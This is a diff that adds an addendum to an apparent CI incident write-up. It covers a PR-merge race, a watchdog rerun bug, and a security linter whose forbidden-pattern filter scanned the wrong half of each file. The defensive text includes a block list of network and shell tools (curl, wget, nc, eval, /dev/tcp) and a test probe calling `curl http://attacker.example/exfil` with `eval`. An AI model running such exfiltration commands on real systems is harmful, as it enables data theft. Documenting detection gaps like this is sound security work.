@@ -299,6 +299,112 @@ notifications, as the residual-risk note above already records — the failure e
 that surfaced this very incident. The deliberate red-on-escalation exit stays; it is
 correct for everything that is not the watchdog itself.
 
+## Addendum 2026-08-31: the promotion PR's phantom checks
+
+From 2026-08-29 every scheduled watchdog run went red, reporting the same three runs as
+needing attention: `Tests`, `Lint community checks`, and `Preston-Check Security Audit`,
+each concluded `failure` on a `threat-intel/automerge-*` branch. None of them had
+tested anything. Each had zero jobs, zero logs, and GitHub's generic "this run likely
+failed because of a workflow file issue" banner — the same signature as the June parse
+error, but with workflow files that were perfectly valid.
+
+The cause was a race inside `threat-intel-orchestrate.yml`. The job opened its
+promotion PR and then squash-merged it with `--delete-branch` in the following step, a
+gap of roughly four seconds. For PR #859 the PR opened at 21:58:49, Actions dispatched
+the three `pull_request` workflows at 21:58:52, and the merge deleted the head branch
+at 21:58:53. The runs never finished resolving their merge ref before it was removed,
+so they died before creating a single job. Re-running one of them unchanged, days
+later, passes: the content and the workflow files were always fine.
+
+The watchdog could not heal them, for a reason worth recording. `rerun_failed()` called
+`/actions/runs/{id}/rerun-failed-jobs`, which re-runs the *failed jobs* of a run. A run
+that died before creating any jobs has no failed jobs to re-run, and the endpoint
+answers `403 This workflow run cannot be retried`. The full `/actions/runs/{id}/rerun`
+endpoint accepts the same run without complaint. The watchdog was therefore blind in
+precisely the class it exists to catch — the run that executes zero steps — and every
+six hours it found three unhealable failures, escalated them, and exited red. Note too
+that GitHub reports this class as plain `failure`, not `startup_failure`, so the
+watchdog's dedicated unparseable-workflow branch never saw them either.
+
+Filtering these runs away at the workflow level is not possible, which is worth stating
+because it is the obvious first instinct. For `pull_request` events the `branches` and
+`branches-ignore` filters match the *base* branch, and every promotion PR targets
+`master`; a job-level `if:` on `github.head_ref` fails for a different reason, since the
+run dies before the workflow file is ever expanded into jobs. There is no head-branch
+filter for `pull_request`. The race had to be fixed at its source.
+
+`threat-intel-orchestrate.yml` now waits for the PR's checks to complete before
+merging. This removes the race, and for the first time makes those checks a real gate
+rather than a decorative one — until now they had never once run to completion on a
+promotion PR. When a check fails the merge step is skipped and the PR stays open, where
+the existing stuck-promotion escalation picks it up after a day, which is the behaviour
+that check was already written to provide.
+
+A second gap surfaced while tracing the first. Because a merge made with the Actions
+token does not fire `on: push` workflows, nothing validated the merged result on master
+either — the promotion landed entirely ungated by `shellcheck`. Generated checks were
+never unsafe, since `sandbox_validate.py`'s bashlex AST wall runs fail-closed before
+promotion, but they were unlinted. The orchestrate job now runs `shellcheck -S warning`
+and `tools/lint-check.sh` against the files it just generated, before the commit is
+made. Both are needed: `lint-check.sh` records a shellcheck failure as a warning and
+still exits zero, so it enforces metadata and forbidden-pattern rules but not shell
+correctness.
+
+Wiring `lint-check.sh` into that gate exposed a third defect, and a more serious one.
+Its forbidden-construct check — the ban on `curl`, `wget`, `nc`, `eval`, `exec`,
+`/dev/tcp` and friends — filtered the file with an awk expression whose flag toggled
+only on the closing `PRESTON_META` delimiter, never on the opening
+`: <<'PRESTON_META'`. It therefore scanned the metadata block and skipped the script
+body, inverting the gate in both directions at once: ten of 738 checks were rejected
+for prose such as "ussync parameters", while a check whose body called
+`curl http://attacker.example/exfil` and `eval "$SRC"` passed with "no forbidden
+patterns". Both directions were demonstrated directly rather than inferred.
+
+The exposure was narrower than it first appears, but real. Auto-generated checks were
+never at risk: `orchestrate.py` gates every synthesized candidate through
+`sandbox_validate.py` independently of the linter. Human-contributed checks were. No
+workflow invokes `sandbox_validate` — it runs only inside `orchestrate.py` — so for a
+check arriving by pull request, `lint-check.sh`'s pattern list was the only automated
+security gate, and it was reading the wrong half of the file.
+
+The regex list is now deleted and the gate delegates to `sandbox_validate.py`, which
+parses the script with bashlex and fails closed. This removes a weaker second
+implementation of a job the pipeline already does soundly: the probe that slipped past
+the old gate is rejected via the AST path, and all ten prose false positives clear.
+`lint-community.yml` installs bashlex so the sound path runs rather than the
+command-start fallback. Had the regex list been left in place, the new orchestrate lint
+gate would have inherited those ten false positives and stalled promotions outright.
+
+Routing hand-written checks through the wall for the first time surfaced a fourth
+defect, in the wall itself. bashlex has no arithmetic-command node: it parses
+`((count += 1))` as a pair of nested subshells wrapping a command whose first word is
+the variable name, so `_walk_for_commands` reported `command not on allowlist: count`
+for ordinary arithmetic. Synthesized checks never use the construct, which kept the
+false positive latent; `checks/community/proposed/201-graphql-introspection.sh` uses it
+twice and was rejected outright. `_normalize_arithmetic` now rewrites `(( ... ))` to the
+same `:` no-op that `[[ ]]` normalisation already relies on, scanning for balanced
+parens because a non-greedy regex truncates nested forms, and leaving `$(( ... ))`
+expansion untouched. The rewrite cannot smuggle anything past the wall: an arithmetic
+context cannot invoke a command, and any `$(...)` inside has already been lifted out by
+`_extract_command_subs` and validated as its own context, so `((count += $(curl ...)))`
+is still rejected — there is a test asserting exactly that. With the misparse fixed, 201
+needed only its backslash-newline continuations joined to satisfy the anti-obfuscation
+rule.
+
+Making the wall the single bar for both paths is the point. Human-contributed and
+synthesized checks now clear the same sound AST gate, rather than the contribution path
+relying on a regex list that was the only thing between a submitted check and `curl`.
+
+One unrelated observation recorded while verifying that reformat, and deliberately not
+fixed here: 201's own `grep -v "test\|spec\|..."` filter discards every line it just
+matched, because the string "introspection" contains "spec". The check cannot report a
+TypeScript finding. It is unshipped, sits in `proposed/`, and behaves identically before
+and after the reformat, so it is left for a deliberate fix.
+
+Finally, `rerun_failed()` falls back to the full re-run endpoint when
+`rerun-failed-jobs` refuses. That restores auto-heal for zero-job runs generally, not
+only for this one cause.
+
 ## Verification record (2026-07-12)
 
 actionlint clean across all workflow files after the fixes. Watchdog dry-run executed
